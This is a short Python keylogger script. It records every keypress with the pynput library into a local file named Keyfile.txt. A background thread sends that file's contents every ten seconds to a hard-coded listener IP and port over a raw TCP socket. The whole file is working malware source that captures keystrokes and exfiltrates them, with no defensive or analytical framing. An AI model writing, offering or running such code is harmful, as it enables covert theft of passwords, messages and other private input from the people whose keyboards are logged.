import socket
import threading
import time
from pynput import keyboard

# Define IP and Port of the listener
SERVER_IP = '192.168.58.130'
SERVER_PORT = 6969  # Use the appropriate port number

# Function to send the log file to the server every 10 seconds
def send_log_file():
    while True:
        try:
            # Open the log file
            with open("Keyfile.txt", "r") as file:
                log_data = file.read()

            # Establish a connection to the server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER_IP, SERVER_PORT))
                s.sendall(log_data.encode('utf-8'))  # Send the log file data

        except Exception as e:
            print(f"Failed to send file: {e}")
        
        time.sleep(10)  # Wait for 10 seconds before sending the file again

# Function to capture and log key presses
def keypress(key):
    print(str(key))
    with open("Keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Failed to write")

# Main function
if __name__ == '__main__':
    # Start the keylogger
    listener = keyboard.Listener(on_press=keypress)
    listener.start()

    # Start the thread to send the log file periodically
    file_sender_thread = threading.Thread(target=send_log_file)
    file_sender_thread.daemon = True  # Allows the thread to exit when the main program does
    file_sender_thread.start()

    # Keep the keylogger running
    listener.join()
